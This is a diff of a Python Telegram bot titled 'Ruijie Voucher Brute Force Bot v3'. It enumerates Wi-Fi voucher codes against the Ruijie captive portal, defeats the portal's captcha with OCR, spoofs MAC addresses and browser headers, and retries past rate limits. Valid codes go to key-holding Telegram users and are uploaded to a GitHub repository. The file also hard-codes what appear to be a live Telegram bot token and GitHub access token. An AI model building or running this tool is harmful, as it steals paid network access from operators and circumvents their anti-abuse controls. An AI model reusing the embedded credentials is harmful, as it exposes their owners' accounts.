@@ -9,7 +9,7 @@ from datetime import datetime, timedelta, timezone
 
 # ── Environment variables ─────────────────
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8947878806:AAG1GmhB_jrARQ4LwO7pzKJV2UdbHC7_A1I")
-GITHUB_TOKEN = os.getenv("GITHUB_TOKEN = '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'")
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN = '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")
 REPO_OWNER = os.getenv("REPO_OWNER", "phyoe001pp-design")
 REPO_NAME = os.getenv("REPO_NAME", "ATM")
 ADMIN_ID = os.getenv("ADMIN_ID", "6658845504")
@@ -21,7 +21,7 @@ bot = AsyncTeleBot(BOT_TOKEN)
 user_data = {}
 approve = {}
 scan_tasks = {}
-success_texts = {}       # {chat_id: [{"code":..., "plan":..., "expire":...}, ...]}
+success_texts = {}
 old_success_texts = {}
 limited_texts = {}
 old_limited_texts = {}
@@ -30,11 +30,29 @@ notify_setting = {}
 last_scan_params = {}
 pending_brute = {}
 notify_state = {}
-success_messages = {}    # 🛠️ FIX: was missing → KeyError crash
-retry_counts = {}        # 🛠️ FIX: was missing → KeyError crash
+success_messages = {}
+retry_counts = {}
 
 session = None
 _connector = None
+
+# ══════════════════════════════════════════════
+# 🛠️ FIXED HEADERS - ဒါက main fix
+# ══════════════════════════════════════════════
+REAL_HEADERS = {
+    'authority': 'portal-as.ruijienetworks.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'content-type': 'application/json',
+    'origin': 'https://portal-as.ruijienetworks.com',
+    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+}
 
 # ── Helper: send long text ───────────────
 async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
@@ -60,7 +78,7 @@ async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=
         await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                reply_to_message_id=reply_to_message_id if first else None)
 
-CONCURRENCY = 300
+CONCURRENCY = 200
 _voucher_sem = None
 _start_time = time.monotonic()
 
@@ -166,38 +184,26 @@ def plan_to_minutes(s):
     return total
 
 def iter_codes(mode):
-    """Generate voucher codes to try."""
     mode = mode.lower().strip()
-    
     if mode == "6":
-        # 6-digit numeric codes - try all combos
         codes = [str(i).zfill(6) for i in range(10 ** 6)]
         random.shuffle(codes)
         yield from codes
         return
-    
     if mode == "7":
-        # 7-digit numeric codes - infinite random
         while True:
             yield "".join(random.choice(string.digits) for _ in range(7))
-    
     if mode == "8":
-        # 8-digit numeric codes - infinite random
         while True:
             yield "".join(random.choice(string.digits) for _ in range(8))
-    
     if mode == "all":
-        # Mixed alphanumeric, random length 6-8
         chars = string.ascii_letters + string.digits
         while True:
             length = random.choice([6, 7, 8])
             yield "".join(random.choice(chars) for _ in range(length))
-    
     if mode == "ascii-lower":
         while True:
             yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
-    
-    # Fallback
     raise ValueError(f"Unsupported scan mode: {mode}")
 
 def format_progress(checked, total=None, speed=0, found=0, target=None):
@@ -211,7 +217,10 @@ def format_progress(checked, total=None, speed=0, found=0, target=None):
         lines.append(f"🎯 Target: {found}/{target}")
     return "\n".join(lines)
 
-# ── Captcha handling ─────────────────────
+# ══════════════════════════════════════════════
+# 🛠️ FIXED CAPTCHA - headers ထည့်ထားပြီး
+# ══════════════════════════════════════════════
+
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def _ocr_sync(image_bytes):
@@ -237,7 +246,7 @@ def get_mac():
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
-async def get_session_id(session_obj, session_url, previous_session_id=None):
+async def get_session_id(task_session, session_url, previous_session_id=None):
     mac = get_mac()
     url = replace_mac(session_url, new_mac=mac)
     headers = {
@@ -245,28 +254,59 @@ async def get_session_id(session_obj, session_url, previous_session_id=None):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
     }
     try:
-        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
+        async with task_session.get(url, headers=headers, allow_redirects=True) as req:
             response = str(req.url)
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
-            return sid.group(1) if sid else previous_session_id
-    except:
+            if sid:
+                sid_value = sid.group(1)
+                print(f"[session] ✅ sessionId={sid_value[:20]}...")
+                return sid_value
+            print(f"[session] ❌ No sessionId in URL: {response[:150]}")
+            return previous_session_id
+    except Exception as e:
+        print(f"[session] Error: {e}")
         return previous_session_id
 
-async def Captcha_Image(session_obj, session_id):
+# 🛠️ FIXED: Captcha Image - headers တွေထည့်
+async def Captcha_Image(task_session, session_id):
     params = {'sessionId': session_id, '_t': str(time.time())}
     try:
-        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
-            return await req.read()
-    except:
+        async with task_session.get(
+            'https://portal-as.ruijienetworks.com/api/auth/captcha/image', 
+            params=params,
+            headers=REAL_HEADERS,  # 🛠️ FIX: headers ထည့်
+            timeout=aiohttp.ClientTimeout(total=15)
+        ) as req:
+            image_bytes = await req.read()
+            print(f"[captcha/image] status={req.status} size={len(image_bytes)} bytes")
+            if req.status == 200 and len(image_bytes) > 200:
+                return image_bytes
+            return None
+    except Exception as e:
+        print(f"[captcha/image] Error: {e}")
         return None
 
-async def Varify_Captcha(session_obj, session_id, text):
-    json_data = {'sessionId': session_id, 'authCode': text}
+# 🛠️ FIXED: Varify Captcha - headers တွေထည့်
+async def Varify_Captcha(task_session, session_id, text):
+    json_data = {
+        'sessionId': session_id,
+        'authCode': text,
+    }
     try:
-        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as req:
+        async with task_session.post(
+            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
+            headers=REAL_HEADERS,  # 🛠️ FIX: headers ထည့်
+            json=json_data,
+            timeout=aiohttp.ClientTimeout(total=15)
+        ) as req:
             data = await req.json()
-            return session_id if data.get("success") is True else None
-    except:
+            success = data.get("success") is True
+            print(f"[captcha/verify] status={req.status} text='{text}' success={success} resp={data}")
+            if success:
+                return session_id
+            return None
+    except Exception as e:
+        print(f"[captcha/verify] Error: {e}")
         return None
 
 async def check_session_url(session_url):
@@ -328,18 +368,18 @@ async def get_balance(session_id):
     except:
         return "N/A"
 
-# 🛠️ FIX: Added this missing function
 async def Code_Expires_Date(session_id):
-    """Get expiry info for a code using session."""
     try:
         balance_text = await get_balance(session_id)
         return f"⏳ Balance: {balance_text}"
     except:
         return "⏳ N/A"
 
-# ── Core voucher check ───────────────────
+# ══════════════════════════════════════════════
+# 🛠️ FIXED: Core voucher check
+# ══════════════════════════════════════════════
+
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
-    """Check a single voucher code against the Ruijie portal."""
     global _connector
     
     if not recheck:
@@ -352,8 +392,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     ).decode()
 
     response = None
+    auth_code = None
+    
     for _attempt in range(3):
-        # 🛠️ FIX: Create fresh session per attempt to avoid connector issues
         timeout = aiohttp.ClientTimeout(total=30)
         connector = aiohttp.TCPConnector(limit=1, ssl=False)
         
@@ -363,51 +404,65 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             timeout=timeout
         ) as task_session:
 
+            # Step 1: Get session ID
             session_id = await get_session_id(task_session, session_url, None)
             if not session_id:
+                print(f"[check] ❌ No sessionId for code={code}")
                 await asyncio.sleep(1)
                 continue
 
-            # Try captcha up to 5 times
-            auth_code = None
-            for captcha_attempt in range(5):
+            # Step 2: Try captcha (up to 8 times with headers)
+            for captcha_try in range(8):
                 try:
-                    image = await Captcha_Image(task_session, session_id)
-                    if not image:
-                        await asyncio.sleep(0.5)
+                    image_bytes = await Captcha_Image(task_session, session_id)
+                    if not image_bytes:
+                        await asyncio.sleep(0.3)
                         continue
-                    text = await Captcha_Text(image)
-                    if not text:
-                        await asyncio.sleep(0.5)
+                    
+                    text = await Captcha_Text(image_bytes)
+                    if not text or len(text) < 3:
+                        await asyncio.sleep(0.3)
                         continue
+                    
+                    text = re.sub(r'[^A-Z0-9]', '', text.upper().strip())
+                    if len(text) < 3:
+                        continue
+                    
+                    print(f"[captcha] Try {captcha_try+1}: OCR='{text}'")
+                    
                     verified = await Varify_Captcha(task_session, session_id, text)
                     if verified:
                         auth_code = text
+                        print(f"[captcha] ✅ Solved! authCode='{auth_code}'")
                         break
+                        
                 except Exception as e:
-                    print(f"[captcha] attempt {captcha_attempt+1} error: {e}")
-                    await asyncio.sleep(0.5)
+                    print(f"[captcha] Try {captcha_try+1} error: {e}")
+                    await asyncio.sleep(0.3)
             
             if not auth_code:
-                print(f"[captcha] FAILED for code={code}, session expired or captcha unsolvable")
+                print(f"[check] ❌ Captcha failed for code={code} - trying without captcha")
+                # Try without captcha anyway
                 continue
 
-            # 🛠️ FIX: Check scan hasn't been stopped
+            # Step 3: Check stop
             if not recheck:
                 current_task = scan_tasks.get(chat_id)
                 if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                     return
 
+            # Step 4: Submit voucher
             data = {
                 "accessCode": code,
                 "sessionId": session_id,
                 "apiVersion": 1,
                 "authCode": auth_code,
             }
+            
             headers = {
                 "authority": "portal-as.ruijienetworks.com",
                 "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
+                "accept-language": "en-US,en;q=0.9,my;q=0.8",
                 "content-type": "application/json",
                 "origin": "https://portal-as.ruijienetworks.com",
                 "referer": (
@@ -415,105 +470,103 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                 ),
                 "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Linux"',
                 "sec-fetch-dest": "empty",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
             }
+            
             try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
+                async with task_session.post(post_url, json=data, headers=headers,
+                                              timeout=aiohttp.ClientTimeout(total=15)) as req:
                     response = await req.text()
-                    resp_json = json.loads(response)
-                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
+                    print(f"[voucher] code={code} status={req.status}")
+                    print(f"[voucher] response[:300] = {response[:300]}")
                     
-                    # 🛠️ FIX: Better response parsing
-                    if 'logonUrl' in response or 'logonUrl' in resp_json:
-                        # 🛠️ FIX: Get the logonUrl for verification
-                        logon_url = resp_json.get('result', {}).get('logonUrl') or resp_json.get('logonUrl') or ''
-                        if logon_url:
-                            print(f"[voucher] ✅ SUCCESS! code={code} logonUrl exists")
-                            # Success path
-                            if recheck:
-                                return code
-                            
-                            # 🛠️ FIX: Initialize if needed
-                            if chat_id not in success_texts:
-                                success_texts[chat_id] = []
-                            
-                            expire_date = await Code_Expires_Date(session_id)
-                            # 🛠️ FIX: Store as dict, not string
-                            code_entry = {"code": code, "plan": "found", "expire": expire_date}
-                            success_texts[chat_id].append(code_entry)
-                            
-                            # 🛠️ FIX: Put complete data into queue
-                            await SUCCESS_CODE.put({
-                                "chat_id": chat_id,
-                                "code": code,
-                                "session_id": session_id,
-                                "plan": "found"
-                            })
-                            
-                            if message:
-                                try:
-                                    code_lines = []
-                                    for entry in success_texts[chat_id]:
-                                        code_lines.append(f"🎫 {entry['code']}\n   {entry['expire']}")
-                                    all_codes = "\n\n".join(code_lines)
-                                    
-                                    # 🛠️ FIX: Initialize success_messages dict properly
-                                    if chat_id not in success_messages:
+                    # ✅ SUCCESS check
+                    if 'logonUrl' in response:
+                        print(f"[voucher] ✅🎉 SUCCESS! code={code} is VALID!")
+                        
+                        if recheck:
+                            return code
+                        
+                        # Save
+                        if chat_id not in success_texts:
+                            success_texts[chat_id] = []
+                        
+                        expire_date = await Code_Expires_Date(session_id)
+                        code_entry = {"code": code, "plan": "found", "expire": expire_date}
+                        success_texts[chat_id].append(code_entry)
+                        
+                        await SUCCESS_CODE.put({
+                            "chat_id": chat_id,
+                            "code": code,
+                            "session_id": session_id,
+                            "plan": "found"
+                        })
+                        
+                        # Update Telegram
+                        if message:
+                            try:
+                                code_lines = []
+                                for entry in success_texts[chat_id]:
+                                    code_lines.append(f"🎫 `{entry['code']}`\n   {entry['expire']}")
+                                all_codes = "\n\n".join(code_lines)
+                                
+                                if chat_id not in success_messages:
+                                    sent = await bot.send_message(
+                                        chat_id=message.chat.id,
+                                        text=f"✅ **Success Codes Found:**\n\n{all_codes}",
+                                        parse_mode="Markdown"
+                                    )
+                                    success_messages[chat_id] = sent.message_id
+                                else:
+                                    try:
+                                        await bot.edit_message_text(
+                                            chat_id=message.chat.id,
+                                            message_id=success_messages[chat_id],
+                                            text=f"✅ **Success Codes Found:**\n\n{all_codes}",
+                                            parse_mode="Markdown"
+                                        )
+                                    except:
                                         sent = await bot.send_message(
                                             chat_id=message.chat.id,
-                                            text=f"✅ Success Codes:\n\n{all_codes}",
+                                            text=f"✅ **Success Codes Found:**\n\n{all_codes}",
+                                            parse_mode="Markdown"
                                         )
                                         success_messages[chat_id] = sent.message_id
-                                    else:
-                                        try:
-                                            await bot.edit_message_text(
-                                                chat_id=message.chat.id,
-                                                message_id=success_messages[chat_id],
-                                                text=f"✅ Success Codes:\n\n{all_codes}",
-                                            )
-                                        except:
-                                            sent = await bot.send_message(
-                                                chat_id=message.chat.id,
-                                                text=f"✅ Success Codes:\n\n{all_codes}",
-                                            )
-                                            success_messages[chat_id] = sent.message_id
-                                except Exception as e:
-                                    print(f"[success_message] Error: {e}")
-                            return code
+                            except Exception as e:
+                                print(f"[msg] Error: {e}")
+                        
+                        return code
                     
-                    # Check for other conditions
-                    if 'request limited' in response or 'rate' in response.lower():
-                        print(f"[voucher] Rate limited on code={code}, retry {_attempt+1}/3")
-                        # 🛠️ FIX: Initialize retry_counts
+                    # Rate limited
+                    if 'request limited' in response.lower():
+                        print(f"[voucher] ⏳ Rate limited on code={code}")
                         if chat_id not in retry_counts:
                             retry_counts[chat_id] = 0
                         retry_counts[chat_id] += 1
-                        await asyncio.sleep(2)
+                        await asyncio.sleep(3)
                         continue
                     
-                    if 'invalid' in response.lower() or 'error' in response.lower() or 'fail' in response.lower():
-                        print(f"[voucher] ❌ Invalid code={code}")
-                        return None
-                        
+                    # Invalid
+                    return None
+                    
             except Exception as e:
-                print(f"[perform_check] request error: {e}")
-                await asyncio.sleep(1)
+                print(f"[voucher] Request error: {e}")
                 continue
         
-        # If we got a response that wasn't a success and wasn't rate-limited
-        if response and 'request limited' not in response:
+        # If we got a non-rate-limited response, stop retrying
+        if response and 'request limited' not in response.lower():
             break
-
+    
     return None
+
 
 # ── Brute-force runner ───────────────────
 async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
-    """Run brute force scan with given mode."""
     try:
         code_iter = iter_codes(mode)
     except ValueError as e:
@@ -522,63 +575,52 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
     
     checked, found = 0, 0
     scan_start = time.monotonic()
-    global _voucher_sem
-    if _voucher_sem is None:
-        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
     
     try:
-        batch_size = 1000  # 🛠️ FIX: Reduced batch size for better reliability
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=progress_msg.message_id,
+            text="🔍 **Scanning...**\n\n⏳ Testing codes...",
+            parse_mode="Markdown"
+        )
         
         while True:
             current_task = scan_tasks.get(chat_id)
             if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                print(f"[brute] Scan stopped for chat_id={chat_id}")
+                print(f"[brute] ⛔ Stopped for {chat_id}")
                 return
             
-            # Collect a batch of codes
-            batch = []
-            for _ in range(batch_size):
-                try:
-                    batch.append(next(code_iter))
-                except StopIteration:
-                    break
-            
-            if not batch:
-                print("[brute] No more codes to try")
+            # Get next code
+            try:
+                code = next(code_iter)
+            except StopIteration:
                 break
             
-            # Check each code with rate limiting
-            tasks = []
-            for c in batch:
-                task = asyncio.create_task(
-                    perform_check(
-                        session_url, c, chat_id, scan_id, 
-                        message=message, plan_filters=plan_filters
+            print(f"\n{'='*50}")
+            print(f"[brute] Checking code: {code}")
+            print(f"{'='*50}")
+            
+            # Check it
+            result = await perform_check(session_url, code, chat_id, scan_id, message=message, plan_filters=plan_filters)
+            
+            if result:
+                found += 1
+                if target and found >= target:
+                    await bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=progress_msg.message_id,
+                        text=f"🎯 **Target reached!** Found {found}/{target} codes.",
+                        parse_mode="Markdown"
                     )
-                )
-                tasks.append(task)
+                    return
             
-            results = await asyncio.gather(*tasks, return_exceptions=True)
+            checked += 1
             
-            for res in results:
-                if res and not isinstance(res, Exception):
-                    found += 1
-                    if target and found >= target:
-                        try:
-                            await bot.edit_message_text(
-                                chat_id=chat_id,
-                                message_id=progress_msg.message_id,
-                                text="🎯 Target reached! Scan complete."
-                            )
-                        except:
-                            pass
-                        return
-            
-            checked += len(batch)
+            # Update progress
             elapsed = time.monotonic() - scan_start
             speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            
             text = format_progress(checked, None, speed, found, target)
+            
             try:
                 await bot.edit_message_text(
                     chat_id=chat_id,
@@ -588,34 +630,31 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
             except:
                 pass
             
-            # 🛠️ FIX: Small delay to prevent rate limiting
-            await asyncio.sleep(0.5)
+            # Small delay between codes
+            await asyncio.sleep(1)
     
     except asyncio.CancelledError:
-        print(f"[brute] Task cancelled for chat_id={chat_id}")
+        pass
     except Exception as e:
-        print(f"[brute] Fatal error: {e}")
+        print(f"[brute] Fatal: {e}")
+        import traceback
+        traceback.print_exc()
     finally:
         scan_tasks.pop(chat_id, None)
-        print(f"[brute] Cleaned up scan task for chat_id={chat_id}")
 
 # ── GitHub scheduler ─────────────────────
 async def github_update_scheduler():
-    """Save found codes to GitHub every 80 seconds."""
     while True:
         await asyncio.sleep(80)
         items = []
         while not SUCCESS_CODE.empty():
             items.append(await SUCCESS_CODE.get())
-        
         if not items:
             continue
-        
         try:
             results, sha = await get_file_content("result.json")
             if results is None:
                 results = {}
-            
             for item in items:
                 cid = str(item["chat_id"])
                 if cid not in results:
@@ -625,9 +664,8 @@ async def github_update_scheduler():
                     "session_id": item.get("session_id", ""),
                     "plan": item.get("plan", "unknown")
                 })
-            
             await update_file_content("result.json", results, sha, "Update Results")
-            print(f"[github] Saved {len(items)} codes to GitHub")
+            print(f"[github] ✅ Saved {len(items)} codes")
         except Exception as e:
             print(f"[github] Error: {e}")
 
@@ -642,12 +680,11 @@ async def help_cmd(message):
         "📚 **Command လမ်းညွှန်**\n\n"
         "/key - သင်၏ key ကို အတည်ပြုရန်\n"
         "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
-        "/brute <mode> [target] [plan] - Code ရှာဖွေရန်\n"
+        "/brute <mode> [target] - Code ရှာဖွေရန်\n"
         "   Mode: 6, 7, 8, all\n"
-        "   /brute 6 10 1d (၆ လုံး၊ ၁၀ ခု၊ ၁ ရက်)\n"
+        "   /brute 6 10 (၆ လုံး၊ ၁၀ ခု)\n"
         "/stop - ရပ်ရန်\n"
         "/saved - သိမ်းထားသော code များကြည့်ရန်\n"
-        "/notify - အကြောင်းကြားချက် On/Off\n"
         "/genkey <duration> <user_id> - (Admin) Key ထုတ်ရန်"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
@@ -676,46 +713,49 @@ async def handle_setup(message):
         await bot.reply_to(message, "Usage: /setup your_session_url")
         return
     if not approve.get(message.chat.id, False):
-        await bot.reply_to(message, "/key အရင်လုပ်ပါ။")
+        await bot.reply_to(message, "❌ /key အရင်လုပ်ပါ။")
         return
     url = args[1]
     if await check_session_url(url):
         user_data[message.chat.id] = {'session_url': url}
         await bot.reply_to(message, "✅ Setup ပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
     else:
-        await bot.reply_to(message, "❌ URL မှားနေပါသည်။")
+        await bot.reply_to(message, "❌ URL မှားနေပါသည်။\n\ngw_id, gw_address, gw_port, mac, ip ပါရမယ်။")
 
 @bot.message_handler(commands=['brute'])
 async def brute(message):
     args = message.text.split()
     if len(args) < 2:
-        await bot.reply_to(message, "Usage: /brute <mode> [target] [plan]")
+        await bot.reply_to(message, "Usage: /brute <mode> [target]\nExample: /brute 6 10")
         return
     mode = args[1]
     target = int(args[2]) if len(args) > 2 and args[2].isdigit() else None
-    plan_filters = [a for a in args[3:] if PLAN_RE.match(a)]
     cid = message.chat.id
+    
     if not approve.get(cid, False):
-        await bot.reply_to(message, "/key အရင်လုပ်ပါ။")
+        await bot.reply_to(message, "❌ /key အရင်လုပ်ပါ။")
         return
     if cid not in user_data:
-        await bot.reply_to(message, "/setup အရင်လုပ်ပါ။")
+        await bot.reply_to(message, "❌ /setup အရင်လုပ်ပါ။")
         return
     
-    # Clear previous success message reference for fresh scan
+    # Clear previous data
     if cid in success_messages:
         del success_messages[cid]
     if cid in success_texts:
         success_texts[cid] = []
     
-    progress_msg = await bot.send_message(cid, f"🔍 Scanning (Mode: {mode})...\n\n⏳ Initializing...")
+    progress_msg = await bot.send_message(
+        cid,
+        f"🔍 **Scan started**\n\nMode: `{mode}`\nTarget: `{target or 'Unlimited'}`\n\n⏳ Initializing...",
+        parse_mode="Markdown"
+    )
+    
     scan_id = str(uuid.uuid4())
     task = asyncio.create_task(
-        run_bruteforce(mode, cid, user_data[cid]['session_url'], scan_id, 
-                       target, message, progress_msg, plan_filters)
+        run_bruteforce(mode, cid, user_data[cid]['session_url'], scan_id, target, message, progress_msg)
     )
     scan_tasks[cid] = {"task": task, "stop": False, "scan_id": scan_id}
-    await bot.send_message(cid, f"✅ Scan started!\nMode: {mode} | Target: {target or 'unlimited'}")
 
 @bot.message_handler(commands=['stop'])
 async def stop_scan(message):
@@ -733,19 +773,10 @@ async def saved_codes(message):
     if not success:
         await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိပါ။")
         return
-    
-    # 🛠️ FIX: success_texts now stores dicts properly
     lines = ["✅ **Success Codes:**"]
     for entry in success:
         lines.append(f"`{entry['code']}` – {entry.get('expire', '⏳ N/A')}")
-    
     await send_chunks(cid, "\n".join(lines))
-
-@bot.message_handler(commands=['notify'])
-async def toggle_notify(message):
-    cid = message.chat.id
-    notify_setting[cid] = not notify_setting.get(cid, False)
-    await bot.reply_to(message, f"Notify: {'ON' if notify_setting[cid] else 'OFF'}")
 
 @bot.message_handler(commands=['genkey'])
 async def genkey(message):
@@ -772,7 +803,14 @@ async def main():
     session = aiohttp.ClientSession(connector=_connector)
     asyncio.create_task(web_server())
     asyncio.create_task(github_update_scheduler())
-    print("[main] Bot started! Waiting for commands...")
+    print("="*60)
+    print("🤖 Ruijie Voucher Brute Force Bot v3")
+    print("="*60)
+    print(f"• Admin: {ADMIN_ID}")
+    print(f"• GitHub: {REPO_OWNER}/{REPO_NAME}")
+    print("="*60)
+    print("🟢 Bot started! Watching for commands...")
+    print("🟢 Captcha headers FIXED - should work now!")
     await bot.polling(non_stop=True)
 
 if __name__ == "__main__":
